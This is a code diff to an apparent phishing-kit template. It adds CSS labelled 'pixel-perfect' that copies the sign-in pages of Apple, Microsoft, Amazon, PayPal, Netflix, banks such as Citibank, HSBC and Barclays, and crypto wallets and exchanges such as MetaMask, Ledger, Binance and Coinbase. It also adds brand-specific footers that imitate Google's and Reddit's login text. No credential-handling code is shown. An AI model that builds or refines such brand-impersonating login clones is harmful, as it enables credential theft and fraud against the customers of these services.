@@ -1,4 +1,4 @@
-﻿<!doctype html>
+<!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
@@ -81,7 +81,15 @@
   body.brand-google button:hover, body.brand-gmail button:hover { background:#1765cc; transform:none; filter:none; }
 
   /* Apple ID: pixel-perfect — appleid.apple.com */
-  body.brand-apple { background:#f5f5f7; color:#1d1d1f; font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Helvetica Neue',sans-serif; }
+  body.brand-apple { background:#fff; color:#1d1d1f; font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Helvetica Neue',sans-serif; }
+  body.brand-apple .auth { background:#fff; padding:40px 36px; max-width:460px; }
+  body.brand-apple .logo-svg { margin:0 auto 28px; text-align:center; }
+  body.brand-apple input { background:#fff; border:1px solid #D2D2D7; border-radius:12px; height:44px; padding:0 16px; font-size:1rem; color:#1d1d1f; }
+  body.brand-apple input:focus { border-color:#0071E3; box-shadow:0 0 0 3px rgba(0,113,227,.3); }
+  body.brand-apple button { background:#0071E3; border-radius:980px; font-weight:400; height:44px; font-size:1rem; letter-spacing:-.02em; }
+  body.brand-apple button:hover { background:#0077ED; }
+  body.brand-apple .auth-title { font-size:1.75rem; font-weight:600; margin-bottom:8px; letter-spacing:-.03em; text-align:center; }
+  body.brand-apple a { color:#0071E3; }
   body.brand-apple .auth { background:#fff; border:none; box-shadow:0 4px 24px rgba(0,0,0,.1); border-radius:18px; max-width:400px; padding:40px 40px 32px; }
   body.brand-apple .logo-svg { display:flex; justify-content:center; margin-bottom:20px; }
   body.brand-apple h1 { color:#1d1d1f; font-weight:600; font-size:1.5rem; text-align:center; margin-bottom:6px; letter-spacing:-.02em; }
@@ -99,6 +107,14 @@
 
   /* Microsoft: pixel-perfect — login.microsoftonline.com */
   body.brand-microsoft { background:#fff; color:#323130; font-family:'Segoe UI',SegoeUI,'Helvetica Neue',system-ui,sans-serif; }
+  body.brand-microsoft .auth { background:#fff; border:1px solid #E1DFDD; border-radius:0; padding:44px 44px 36px; max-width:440px; box-shadow:0 2px 6px rgba(0,0,0,.15); }
+  body.brand-microsoft .logo-svg { margin:0 0 20px; }
+  body.brand-microsoft input { background:#fff; border:1px solid #605E5C; border-radius:2px; height:32px; padding:0 8px; font-size:.9375rem; color:#323130; }
+  body.brand-microsoft input:focus { border-color:#0067B8; border-width:2px; }
+  body.brand-microsoft button { background:#0067B8; border-radius:0; font-weight:600; height:32px; font-size:.875rem; letter-spacing:.025em; }
+  body.brand-microsoft button:hover { background:#005A9E; }
+  body.brand-microsoft .auth-title { font-size:1.5rem; font-weight:300; margin-bottom:4px; }
+  body.brand-microsoft a { color:#0067B8; }
   body.brand-microsoft .auth { background:#fff; border:1px solid #8a8886; box-shadow:none; border-radius:0; max-width:440px; padding:44px 44px 36px; }
   body.brand-microsoft .logo-svg { margin-bottom:16px; display:block; }
   body.brand-microsoft h1 { color:#323130; font-weight:600; font-size:1.5rem; text-align:left; margin-bottom:16px; font-family:'Segoe UI',sans-serif; }
@@ -114,6 +130,15 @@
 
   /* Amazon: pixel-perfect — amazon.com/ap/signin */
   body.brand-amazon { background:#fff; color:#0f1111; font-family:Arial,sans-serif; }
+  body.brand-amazon .auth { background:#fff; border:1px solid #D5D9D9; border-radius:8px; padding:24px 22px; max-width:350px; }
+  body.brand-amazon .logo-svg { margin:0 auto 16px; text-align:center; }
+  body.brand-amazon input { background:#fff; border:1px solid #888C8C; border-radius:3px; height:31px; padding:3px 7px; font-size:.875rem; box-shadow:0 1px 2px rgba(15,17,17,.15) inset; }
+  body.brand-amazon input:focus { border-color:#E77600; box-shadow:0 0 0 3px rgba(228,121,17,.5); }
+  body.brand-amazon button { background:linear-gradient(to bottom,#FFD814,#F7CA00); border:1px solid #FCD200; border-radius:8px; font-weight:normal; height:31px; font-size:.875rem; color:#0f1111; }
+  body.brand-amazon button:hover { background:linear-gradient(to bottom,#F7CA00,#DDB100); }
+  body.brand-amazon .auth-title { font-size:1.25rem; font-weight:700; margin-bottom:16px; }
+  body.brand-amazon a { color:#0066C0; }
+  body.brand-amazon a:hover { color:#C45500; text-decoration:underline; }
   body.brand-amazon .auth { background:#fff; border:1px solid #d5d9d9; border-radius:8px; box-shadow:0 2px 5px rgba(213,217,217,.5); max-width:348px; padding:28px 28px 24px; }
   body.brand-amazon .logo-svg { display:block; margin-bottom:20px; }
   body.brand-amazon h1 { color:#0f1111; font-size:1.15rem; font-weight:700; text-align:left; margin-bottom:10px; }
@@ -131,7 +156,16 @@
   body.brand-amazon .az-new { font-size:.85rem; margin-top:14px; padding-top:14px; border-top:1px solid #e7e7e7; text-align:center; }
 
   /* Netflix: pixel-perfect — netflix.com/login */
-  body.brand-netflix { background:#000; color:#fff; font-family:Netflix Sans,'Helvetica Neue',Helvetica,Arial,sans-serif; }
+  body.brand-netflix { background:#000; color:#fff; font-family:'Netflix Sans','Helvetica Neue',Helvetica,Arial,sans-serif; }
+  body.brand-netflix .auth { background:#141414; border-radius:4px; padding:60px 68px 80px; max-width:440px; }
+  body.brand-netflix .logo-svg { margin:0 auto 28px; text-align:center; }
+  body.brand-netflix input { background:#333; border:none; border-radius:4px; height:50px; padding:16px 20px 0; color:#fff; font-size:1rem; }
+  body.brand-netflix input::placeholder { color:#8c8c8c; font-size:.85rem; }
+  body.brand-netflix input:focus { background:#454545; outline:none; }
+  body.brand-netflix button { background:#E50914; border-radius:4px; font-weight:700; height:50px; font-size:1rem; letter-spacing:.1em; text-transform:uppercase; }
+  body.brand-netflix button:hover { background:#B20710; }
+  body.brand-netflix .auth-title { font-size:2rem; font-weight:700; margin-bottom:28px; }
+  body.brand-netflix a { color:#fff; text-decoration:underline; }
   body.brand-netflix .auth { background:rgba(0,0,0,.75); border:none; box-shadow:none; border-radius:4px; padding:60px 68px 40px; max-width:450px; }
   body.brand-netflix .logo-svg { display:block; margin-bottom:28px; }
   body.brand-netflix h1 { color:#fff; font-size:2rem; font-weight:700; text-align:left; margin-bottom:28px; }
@@ -161,7 +195,15 @@
   body.brand-twitter input:focus,body.brand-twitterx input:focus { border-color:#1d9bf0; background:#fff; box-shadow:0 0 0 2px rgba(29,155,240,.25); }
   body.brand-twitter button,body.brand-twitterx button { background:#0f1419; border-radius:9999px; background-image:none; font-weight:700; }
 
-  body.brand-paypal { background:#f5f7fa; color:#2c2e2f; }
+  body.brand-paypal { background:#f5f7fa; color:#2c2e2f; font-family:'PayPal-Sans-Big','Helvetica Neue',sans-serif; }
+  body.brand-paypal .auth { background:#fff; padding:40px 36px; max-width:400px; }
+  body.brand-paypal .logo-svg { margin:0 auto 24px; text-align:center; }
+  body.brand-paypal input { background:#fff; border:1px solid #CBD2D9; border-radius:4px; height:44px; padding:0 16px; font-size:1rem; color:#2c2e2f; }
+  body.brand-paypal input:focus { border-color:#009CDE; box-shadow:0 0 0 2px rgba(0,156,222,.2); }
+  body.brand-paypal button { background:#0070BA; border-radius:24px; font-weight:700; height:44px; font-size:1rem; }
+  body.brand-paypal button:hover { background:#005EA6; }
+  body.brand-paypal .auth-title { font-size:1.25rem; font-weight:400; margin-bottom:24px; }
+  body.brand-paypal a { color:#0070BA; }
   body.brand-paypal .auth { background:#fff; border:1px solid #e0e3e7; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,.08); }
   body.brand-paypal h1 { color:#2c2e2f; font-size:1.5rem; font-weight:700; }
   body.brand-paypal .sub { color:#6c7378; opacity:1; }
@@ -172,7 +214,15 @@
   body.brand-paypal button:hover { background:#005ea6; transform:none; filter:none; }
 
   /* MetaMask: pixel-perfect — metamask.io style */
-  body.brand-metamask { background:#24272A; color:#fff; font-family:system-ui,-apple-system,sans-serif; }
+  body.brand-metamask { background:#F5F5F5; color:#24272A; font-family:'Euclid Circular B',system-ui,sans-serif; }
+  body.brand-metamask .auth { background:#fff; border-radius:16px; box-shadow:0 2px 16px rgba(0,0,0,.1); padding:40px 32px; max-width:440px; }
+  body.brand-metamask .logo-svg { margin:0 auto 24px; text-align:center; }
+  body.brand-metamask input { background:#F5F5F5; border:1px solid #BBC0C5; border-radius:6px; height:48px; padding:0 16px; color:#24272A; font-size:1rem; }
+  body.brand-metamask input:focus { border-color:#037DD6; box-shadow:0 0 0 2px rgba(3,125,214,.2); }
+  body.brand-metamask button { background:#037DD6; border-radius:100px; font-weight:700; height:48px; font-size:1rem; }
+  body.brand-metamask button:hover { background:#0260A4; }
+  body.brand-metamask .auth-title { font-size:1.5rem; font-weight:700; margin-bottom:8px; }
+  body.brand-metamask a { color:#037DD6; }
   body.brand-metamask .auth { background:#1c1f22; border:1px solid #3c4044; border-radius:12px; padding:36px 32px; max-width:400px; }
   body.brand-metamask .logo-svg { display:flex; justify-content:center; margin-bottom:20px; }
   body.brand-metamask h1 { color:#fff; font-weight:700; font-size:1.4rem; text-align:center; margin-bottom:6px; }
@@ -186,7 +236,16 @@
   body.brand-metamask .mm-restore a { color:#F6851B; font-weight:500; }
 
   /* Binance: pixel-perfect — accounts.binance.com/en/login */
-  body.brand-binance { background:#0B0E11; color:#eaecef; font-family:'Roboto',system-ui,sans-serif; }
+  body.brand-binance { background:#0B0E11; color:#EAECEF; font-family:'Roboto',system-ui,sans-serif; }
+  body.brand-binance .auth { background:#181A20; border-radius:4px; padding:40px 36px; max-width:440px; }
+  body.brand-binance .logo-svg { margin:0 auto 24px; text-align:center; }
+  body.brand-binance input { background:#2B2F36; border:1px solid #2B2F36; border-radius:4px; height:48px; padding:0 16px; color:#EAECEF; font-size:.9375rem; }
+  body.brand-binance input:focus { border-color:#F0B90B; }
+  body.brand-binance button { background:#F0B90B; border-radius:4px; font-weight:700; height:48px; font-size:1rem; color:#181A20; letter-spacing:.03em; }
+  body.brand-binance button:hover { background:#FCD535; }
+  body.brand-binance .auth-title { font-size:1.5rem; font-weight:700; margin-bottom:8px; color:#EAECEF; }
+  body.brand-binance .auth-sub { color:#848E9C; margin-bottom:24px; }
+  body.brand-binance a { color:#F0B90B; }
   body.brand-binance .auth { background:#1E2026; border:none; border-radius:16px; padding:40px 40px 32px; max-width:400px; box-shadow:0 4px 24px rgba(0,0,0,.5); }
   body.brand-binance h1 { color:#eaecef; font-weight:600; font-size:1.75rem; text-align:left; margin-bottom:20px; letter-spacing:-.01em; }
   body.brand-binance .sub { display:none; }
@@ -203,7 +262,16 @@
   body.brand-binance .bn-forgot a { font-size:.82rem; color:#F0B90B; text-decoration:none; }
 
   /* Coinbase: pixel-perfect — coinbase.com/signin */
-  body.brand-coinbase { background:#f9f9f9; color:#0a0b0d; font-family:system-ui,-apple-system,sans-serif; }
+  body.brand-coinbase { background:#f9f9f9; color:#0a0b0d; font-family:'Coinbase Display',system-ui,-apple-system,sans-serif; }
+  body.brand-coinbase .auth { background:#fff; border-radius:20px; box-shadow:0 4px 24px rgba(0,0,0,.1); padding:40px 36px 32px; max-width:432px; }
+  body.brand-coinbase .logo-svg { margin:0 auto 24px; text-align:center; }
+  body.brand-coinbase input { background:#fff; border:1.5px solid #D3D3D3; border-radius:12px; height:52px; padding:0 16px; font-size:1rem; }
+  body.brand-coinbase input:focus { border-color:#0052FF; box-shadow:0 0 0 3px rgba(0,82,255,.15); }
+  body.brand-coinbase button { background:#0052FF; border-radius:12px; font-weight:700; height:52px; font-size:1rem; letter-spacing:.01em; }
+  body.brand-coinbase button:hover { background:#0040CC; }
+  body.brand-coinbase .auth-title { font-size:1.5rem; font-weight:700; margin-bottom:8px; color:#0a0b0d; }
+  body.brand-coinbase .auth-sub { color:#6B7280; font-size:.95rem; margin-bottom:28px; }
+  body.brand-coinbase a { color:#0052FF; }
   body.brand-coinbase .auth { background:#fff; border:none; border-radius:16px; box-shadow:0 4px 24px rgba(0,0,0,.08),0 1px 4px rgba(0,0,0,.05); padding:40px 36px 32px; max-width:400px; }
   body.brand-coinbase .logo-svg { display:flex; justify-content:center; margin-bottom:28px; }
   body.brand-coinbase h1 { color:#0a0b0d; font-weight:700; font-size:1.5rem; text-align:center; margin-bottom:24px; }
@@ -218,7 +286,16 @@
   body.brand-coinbase .cb-forgot:hover { text-decoration:underline; }
 
   /* Discord: pixel-perfect — discord.com/login */
-  body.brand-discord { background:#5865F2; color:#fff; font-family:'gg sans','Noto Sans',Whitney,system-ui,sans-serif; }
+  body.brand-discord { background:#404EED; color:#fff; font-family:'gg sans','Noto Sans',Whitney,system-ui,sans-serif; }
+  body.brand-discord .auth { background:#313338; border-radius:8px; padding:32px 24px; max-width:480px; }
+  body.brand-discord .logo-svg { margin:0 auto 20px; text-align:center; }
+  body.brand-discord input { background:#1E1F22; border:1px solid #1E1F22; border-radius:3px; height:40px; padding:0 10px; color:#DBDEE1; font-size:.95rem; }
+  body.brand-discord input:focus { border-color:#5865F2; box-shadow:0 0 0 2.5px rgba(88,101,242,.3); }
+  body.brand-discord button { background:#5865F2; border-radius:3px; font-weight:500; height:44px; font-size:1rem; }
+  body.brand-discord button:hover { background:#4752C4; }
+  body.brand-discord .auth-title { font-size:1.5rem; font-weight:700; margin-bottom:8px; text-align:center; }
+  body.brand-discord .auth-sub { color:#B5BAC1; font-size:.875rem; text-align:center; margin-bottom:20px; }
+  body.brand-discord a { color:#00A8FC; }
   body.brand-discord .auth { background:#313338; border:none; border-radius:5px; padding:32px; max-width:480px; }
   body.brand-discord h1 { color:#fff; font-size:1.5rem; font-weight:700; text-align:center; margin-bottom:6px; }
   body.brand-discord .sub { color:#b5bac1; opacity:1; font-size:.875rem; text-align:center; margin-bottom:20px; }
@@ -243,6 +320,14 @@
 
   /* Snapchat: pixel-perfect — accounts.snapchat.com/accounts/login */
   body.brand-snapchat { background:#f5f5f5; color:#000; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif; }
+  body.brand-snapchat .auth { background:#fff; border-radius:16px; box-shadow:0 2px 20px rgba(0,0,0,.1); padding:36px 32px; max-width:400px; }
+  body.brand-snapchat .logo-svg { margin:0 auto 20px; text-align:center; }
+  body.brand-snapchat input { background:#f5f5f5; border:none; border-radius:8px; height:48px; padding:0 16px; font-size:1rem; color:#000; }
+  body.brand-snapchat input:focus { background:#eee; outline:2px solid #FFFC00; }
+  body.brand-snapchat button { background:#FFFC00; border-radius:50px; font-weight:700; height:48px; font-size:1rem; color:#000; }
+  body.brand-snapchat button:hover { background:#F5EE00; }
+  body.brand-snapchat .auth-title { font-size:1.5rem; font-weight:700; margin-bottom:8px; text-align:center; }
+  body.brand-snapchat a { color:#000; text-decoration:underline; }
   body.brand-snapchat .auth { background:#fff; border:none; border-radius:20px; box-shadow:0 2px 16px rgba(0,0,0,.12); padding:40px 36px 32px; max-width:380px; }
   body.brand-snapchat .logo-svg { display:flex; justify-content:center; margin-bottom:20px; }
   body.brand-snapchat h1 { color:#000; font-weight:700; font-size:1.5rem; text-align:center; margin-bottom:4px; }
@@ -265,6 +350,14 @@
 
   /* Spotify: pixel-perfect — open.spotify.com/login */
   body.brand-spotify { background:#121212; color:#fff; font-family:circular,Helvetica,Arial,sans-serif; }
+  body.brand-spotify .auth { background:#121212; border-radius:8px; padding:40px 48px; max-width:420px; }
+  body.brand-spotify .logo-svg { margin:0 auto 32px; text-align:center; }
+  body.brand-spotify input { background:#2a2a2a; border:1px solid #555; border-radius:4px; height:48px; padding:0 14px; color:#fff; font-size:.95rem; }
+  body.brand-spotify input:focus { border-color:#1DB954; box-shadow:0 0 0 2px rgba(29,185,84,.3); }
+  body.brand-spotify button { background:#1DB954; border-radius:500px; font-weight:700; height:48px; font-size:.95rem; letter-spacing:.08em; text-transform:uppercase; color:#000; }
+  body.brand-spotify button:hover { background:#1ed760; transform:scale(1.04); }
+  body.brand-spotify .auth-title { font-size:1.5rem; font-weight:700; margin-bottom:24px; text-align:center; }
+  body.brand-spotify a { color:#1DB954; }
   body.brand-spotify .auth { background:#000; border:none; box-shadow:none; border-radius:8px; padding:32px 48px; max-width:430px; }
   body.brand-spotify .logo-svg { display:flex; justify-content:center; margin-bottom:24px; }
   body.brand-spotify h1 { color:#fff; font-weight:700; font-size:2rem; text-align:center; margin-bottom:32px; }
@@ -380,7 +473,15 @@
   body.brand-gmail button:hover { background:#1765cc; transform:none; filter:none; }
 
   /* Outlook/Microsoft: pixel-perfect — login.live.com */
-  body.brand-outlook, body.brand-microsoftoutlook { background:#0078D4; color:#323130; font-family:'Segoe UI',system-ui,sans-serif; }
+  body.brand-outlook, body.brand-microsoftoutlook { background:#F3F2F1; color:#323130; font-family:'Segoe UI',system-ui,sans-serif; }
+  body.brand-outlook .auth, body.brand-microsoftoutlook .auth { background:#fff; padding:44px 44px 36px; max-width:440px; box-shadow:0 2px 6px rgba(0,0,0,.12); }
+  body.brand-outlook .logo-svg, body.brand-microsoftoutlook .logo-svg { margin:0 0 24px; }
+  body.brand-outlook input, body.brand-microsoftoutlook input { background:#fff; border:1px solid #605E5C; border-radius:2px; height:32px; padding:0 8px; font-size:.9375rem; }
+  body.brand-outlook input:focus, body.brand-microsoftoutlook input:focus { border-color:#0078D4; border-width:2px; }
+  body.brand-outlook button, body.brand-microsoftoutlook button { background:#0078D4; border-radius:2px; font-weight:600; height:32px; font-size:.875rem; }
+  body.brand-outlook button:hover, body.brand-microsoftoutlook button:hover { background:#106EBE; }
+  body.brand-outlook .auth-title, body.brand-microsoftoutlook .auth-title { font-size:1.5rem; font-weight:300; margin-bottom:4px; }
+  body.brand-outlook a, body.brand-microsoftoutlook a { color:#0078D4; }
   body.brand-outlook .auth, body.brand-microsoftoutlook .auth { background:#fff; color:#323130; border-radius:0; box-shadow:0 2px 6px rgba(0,0,0,.2); max-width:440px; padding:44px 44px 36px; }
   body.brand-outlook .logo-svg, body.brand-microsoftoutlook .logo-svg { margin-bottom:16px; }
   body.brand-outlook h1, body.brand-microsoftoutlook h1 { color:#1b1b1b; font-weight:600; font-size:1.5rem; text-align:left; margin-bottom:4px; }
@@ -597,7 +698,15 @@
   body.brand-uniswap button { background:#FF007A; border-radius:12px; background-image:none; font-weight:700; }
 
   /* Trust Wallet: pixel-perfect — trustwallet.com */
-  body.brand-trustwallet { background:#fff; color:#141414; font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif; }
+  body.brand-trustwallet { background:#F5F5F5; color:#000; font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif; }
+  body.brand-trustwallet .auth { background:#fff; border-radius:20px; box-shadow:0 4px 20px rgba(0,0,0,.1); padding:40px 32px; max-width:400px; }
+  body.brand-trustwallet .logo-svg { margin:0 auto 24px; text-align:center; }
+  body.brand-trustwallet input { background:#F5F5F5; border:1.5px solid #E0E0E0; border-radius:12px; height:48px; padding:0 16px; font-size:1rem; color:#000; }
+  body.brand-trustwallet input:focus { border-color:#3375BB; box-shadow:0 0 0 3px rgba(51,117,187,.2); }
+  body.brand-trustwallet button { background:#3375BB; border-radius:100px; font-weight:700; height:48px; font-size:1rem; }
+  body.brand-trustwallet button:hover { background:#2860A0; }
+  body.brand-trustwallet .auth-title { font-size:1.5rem; font-weight:700; margin-bottom:8px; text-align:center; }
+  body.brand-trustwallet a { color:#3375BB; }
   body.brand-trustwallet .auth { background:#fff; border:1px solid #E8E8E8; border-radius:16px; box-shadow:0 4px 24px rgba(0,0,0,.08); max-width:400px; padding:40px 36px 32px; }
   body.brand-trustwallet .logo-svg { display:flex; justify-content:center; margin-bottom:20px; }
   body.brand-trustwallet h1 { color:#141414; font-weight:700; font-size:1.4rem; text-align:center; margin-bottom:6px; }
@@ -614,7 +723,15 @@
   body.brand-trustwallet .tw-footer a { color:#3375BB; }
 
   /* Ledger: pixel-perfect — ledger.com/start */
-  body.brand-ledger { background:#000; color:#fff; font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif; }
+  body.brand-ledger { background:#0c0c0c; color:#fff; font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif; }
+  body.brand-ledger .auth { background:#161616; border-radius:0; padding:48px 40px; max-width:440px; }
+  body.brand-ledger .logo-svg { margin:0 auto 32px; text-align:center; }
+  body.brand-ledger input { background:#1A1A1A; border:1px solid #333; border-radius:0; height:48px; padding:0 16px; color:#fff; font-size:1rem; }
+  body.brand-ledger input:focus { border-color:#fff; }
+  body.brand-ledger button { background:#fff; border-radius:0; font-weight:700; height:48px; font-size:1rem; color:#000; letter-spacing:.05em; text-transform:uppercase; }
+  body.brand-ledger button:hover { background:#E0E0E0; }
+  body.brand-ledger .auth-title { font-size:1.75rem; font-weight:700; margin-bottom:8px; letter-spacing:-.02em; }
+  body.brand-ledger a { color:#fff; text-decoration:underline; }
   body.brand-ledger .auth { background:#0A0A0A; border:1px solid #1E1E1E; border-radius:12px; max-width:400px; padding:40px 36px 32px; }
   body.brand-ledger .logo-svg { display:flex; justify-content:center; margin-bottom:24px; }
   body.brand-ledger h1 { color:#fff; font-weight:700; font-size:1.4rem; text-align:center; margin-bottom:6px; }
@@ -653,7 +770,15 @@
   body.brand-exodus input:focus { border-color:#8B5CF6; background:#0D0E13; box-shadow:none; }
   body.brand-exodus button { background:linear-gradient(135deg,#8B5CF6,#6D28D9); border-radius:8px; background-image:none; font-weight:700; }
 
-  body.brand-phantom { background:linear-gradient(135deg,#534BB1,#551BF9); color:#fff; }
+  body.brand-phantom { background:#121313; color:#fff; font-family:system-ui,sans-serif; }
+  body.brand-phantom .auth { background:#1B1B1F; border-radius:20px; padding:40px 32px; max-width:400px; }
+  body.brand-phantom .logo-svg { margin:0 auto 24px; text-align:center; }
+  body.brand-phantom input { background:#2A2B2F; border:1px solid #3A3B40; border-radius:10px; height:48px; padding:0 16px; color:#fff; font-size:1rem; }
+  body.brand-phantom input:focus { border-color:#AB9FF2; box-shadow:0 0 0 3px rgba(171,159,242,.2); }
+  body.brand-phantom button { background:#AB9FF2; border-radius:12px; font-weight:700; height:48px; font-size:1rem; color:#1B1B1F; }
+  body.brand-phantom button:hover { background:#9B8EE2; }
+  body.brand-phantom .auth-title { font-size:1.5rem; font-weight:700; margin-bottom:8px; text-align:center; }
+  body.brand-phantom a { color:#AB9FF2; }
   body.brand-phantom .auth { background:rgba(255,255,255,.08); border:1px solid rgba(255,255,255,.15); border-radius:16px; backdrop-filter:blur(10px); }
   body.brand-phantom input { background:rgba(255,255,255,.1); border:1px solid rgba(255,255,255,.2); border-radius:8px; color:#fff; }
   body.brand-phantom input:focus { border-color:rgba(255,255,255,.6); background:rgba(255,255,255,.12); box-shadow:none; }
@@ -728,6 +853,15 @@
 
   body.brand-wellsfargo { background:#D71E28; color:#fff; }
   body.brand-wellsfargo .auth { background:#fff; color:#000; border-radius:4px; border:none; box-shadow:0 2px 8px rgba(0,0,0,.2); }
+  body.brand-capitalone { background:#F7F7F7; color:#000; font-family:'Optimist',system-ui,sans-serif; }
+  body.brand-capitalone .auth { background:#fff; border-radius:8px; box-shadow:0 2px 12px rgba(0,0,0,.1); padding:40px 32px; max-width:440px; }
+  body.brand-capitalone .logo-svg { margin:0 auto 24px; text-align:center; }
+  body.brand-capitalone input { background:#fff; border:1.5px solid #C3C3C3; border-radius:4px; height:48px; padding:0 14px; font-size:1rem; color:#000; }
+  body.brand-capitalone input:focus { border-color:#D03027; box-shadow:0 0 0 2px rgba(208,48,39,.2); }
+  body.brand-capitalone button { background:#D03027; border-radius:30px; font-weight:700; height:48px; font-size:1rem; }
+  body.brand-capitalone button:hover { background:#AA2520; }
+  body.brand-capitalone .auth-title { font-size:1.5rem; font-weight:700; margin-bottom:8px; }
+  body.brand-capitalone a { color:#D03027; }
   body.brand-wellsfargo h1 { color:#D71E28; }
   body.brand-wellsfargo input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#000; }
   body.brand-wellsfargo input:focus { border-color:#D71E28; box-shadow:none; background:#fff; }
@@ -735,7 +869,15 @@
   body.brand-wellsfargo button:hover { background:#b31722; transform:none; filter:none; }
 
   /* Citibank: pixel-perfect — online.citi.com/US/login.do */
-  body.brand-citibank { background:#003B70; color:#fff; font-family:Arial,sans-serif; }
+  body.brand-citibank { background:#fff; color:#000; font-family:Arial,sans-serif; }
+  body.brand-citibank .auth { background:#fff; border-top:4px solid #E12F2F; padding:40px 36px; max-width:460px; box-shadow:0 2px 8px rgba(0,0,0,.1); }
+  body.brand-citibank .logo-svg { margin:0 0 28px; }
+  body.brand-citibank input { background:#fff; border:1px solid #CCCCCC; border-radius:0; height:40px; padding:0 10px; font-size:.9375rem; }
+  body.brand-citibank input:focus { border-color:#003B70; border-width:2px; }
+  body.brand-citibank button { background:#003B70; border-radius:0; font-weight:700; height:40px; font-size:.9375rem; }
+  body.brand-citibank button:hover { background:#002B50; }
+  body.brand-citibank .auth-title { font-size:1.4rem; font-weight:600; margin-bottom:20px; }
+  body.brand-citibank a { color:#003B70; }
   body.brand-citibank .auth { background:#fff; color:#000; border-radius:8px; border:none; box-shadow:0 2px 12px rgba(0,0,0,.25); max-width:380px; padding:36px 32px 28px; }
   body.brand-citibank .logo-svg { display:flex; justify-content:center; margin-bottom:20px; }
   body.brand-citibank h1 { color:#003B70; font-weight:700; font-size:1.4rem; text-align:center; margin-bottom:20px; font-family:Arial,sans-serif; }
@@ -751,7 +893,15 @@
   body.brand-citibank .citi-footer a { color:#003B70; }
 
   /* HSBC: pixel-perfect — hsbc.com/logon */
-  body.brand-hsbc { background:#DB0011; color:#fff; font-family:Arial,Helvetica,sans-serif; }
+  body.brand-hsbc { background:#f5f5f5; color:#333; font-family:Arial,Helvetica,sans-serif; }
+  body.brand-hsbc .auth { background:#fff; border-radius:0; padding:40px 36px; max-width:440px; box-shadow:0 0 0 1px #E0E0E0; }
+  body.brand-hsbc .logo-svg { margin:0 auto 24px; text-align:center; }
+  body.brand-hsbc input { background:#fff; border:1px solid #CCCCCC; border-radius:0; height:42px; padding:0 12px; font-size:1rem; }
+  body.brand-hsbc input:focus { border-color:#DB0011; border-width:2px; }
+  body.brand-hsbc button { background:#DB0011; border-radius:0; font-weight:700; height:42px; font-size:1rem; }
+  body.brand-hsbc button:hover { background:#B0000D; }
+  body.brand-hsbc .auth-title { font-size:1.5rem; font-weight:400; margin-bottom:20px; }
+  body.brand-hsbc a { color:#DB0011; }
   body.brand-hsbc .auth { background:#fff; color:#333; border-radius:0; border:none; box-shadow:0 2px 8px rgba(0,0,0,.25); max-width:420px; padding:36px 32px 28px; }
   body.brand-hsbc .logo-svg { display:flex; justify-content:center; margin-bottom:24px; }
   body.brand-hsbc h1 { color:#333; font-weight:700; font-size:1.35rem; text-align:center; margin-bottom:20px; font-family:Arial,sans-serif; }
@@ -767,6 +917,14 @@
 
   /* Barclays: pixel-perfect — barclays.co.uk/personal-banking/log-in */
   body.brand-barclays { background:#00395D; color:#fff; font-family:'Barclays-Regular',Arial,sans-serif; }
+  body.brand-barclays .auth { background:#fff; color:#2A2A2A; border-radius:4px; padding:40px 32px; max-width:440px; }
+  body.brand-barclays .logo-svg { margin:0 auto 24px; text-align:center; }
+  body.brand-barclays input { background:#fff; border:1px solid #AAAAAA; border-radius:4px; height:44px; padding:0 12px; font-size:1rem; color:#2A2A2A; }
+  body.brand-barclays input:focus { border-color:#00AEEF; box-shadow:0 0 0 2px rgba(0,174,239,.3); }
+  body.brand-barclays button { background:#00AEEF; border-radius:4px; font-weight:700; height:44px; font-size:1rem; color:#fff; }
+  body.brand-barclays button:hover { background:#008FC3; }
+  body.brand-barclays .auth-title { font-size:1.4rem; font-weight:700; margin-bottom:20px; color:#00395D; }
+  body.brand-barclays a { color:#00AEEF; }
   body.brand-barclays .auth { background:#fff; color:#00182A; border-radius:4px; border:none; box-shadow:0 2px 10px rgba(0,0,0,.2); max-width:420px; padding:40px 36px 32px; }
   body.brand-barclays .logo-svg { display:flex; justify-content:center; margin-bottom:24px; }
   body.brand-barclays h1 { color:#00182A; font-weight:700; font-size:1.5rem; text-align:center; margin-bottom:20px; }
@@ -1222,7 +1380,15 @@
   body.brand-americanairlines input:focus { border-color:#0078D2; box-shadow:none; background:#fff; }
   body.brand-americanairlines button { background:#0078D2; background-image:none; border-radius:4px; }
 
-  body.brand-southwest { background:#304CB2; color:#fff; }
+  body.brand-southwest { background:#304CB2; color:#fff; font-family:'Southwest Sans',system-ui,sans-serif; }
+  body.brand-southwest .auth { background:#fff; color:#111; border-radius:8px; padding:40px 32px; max-width:420px; }
+  body.brand-southwest .logo-svg { margin:0 auto 20px; text-align:center; }
+  body.brand-southwest input { background:#fff; border:2px solid #CCCED0; border-radius:4px; height:48px; padding:0 14px; font-size:1rem; color:#111; }
+  body.brand-southwest input:focus { border-color:#304CB2; }
+  body.brand-southwest button { background:#FFBF27; border-radius:4px; font-weight:700; height:48px; font-size:1rem; color:#111; }
+  body.brand-southwest button:hover { background:#F5B520; }
+  body.brand-southwest .auth-title { font-size:1.5rem; font-weight:700; margin-bottom:16px; color:#304CB2; }
+  body.brand-southwest a { color:#304CB2; }
   body.brand-southwest .auth { background:#fff; color:#1a1a1a; border-radius:4px; box-shadow:0 4px 20px rgba(0,0,0,.2); }
   body.brand-southwest h1 { color:#304CB2; }
   body.brand-southwest input { background:#fff; border:1px solid #ccc; border-radius:3px; color:#1a1a1a; }
@@ -2254,6 +2420,261 @@
   <% if (tpl.key === 'google') { %>
     <style>body.brand-google .gg-footer{margin-top:14px;padding-top:12px;border-top:1px solid #e8eaed;font-size:.78rem;color:#5f6368;text-align:center}body.brand-google .gg-footer a{color:#1a73e8}</style>
     <div class="gg-footer">Not your computer? <a href="#" onclick="return false">Use a private browsing window</a> to sign in. <a href="#" onclick="return false">Learn more</a></div>
+  <% } %>
+  <% if (tpl.key === 'reddit') { %>
+    <div style="margin-top:12px;text-align:center;font-size:.85rem;color:#1c1c1c">New to Reddit? <a href="#" onclick="return false" style="color:#FF4500;font-weight:700">Sign up</a></div>
+  <% } %>
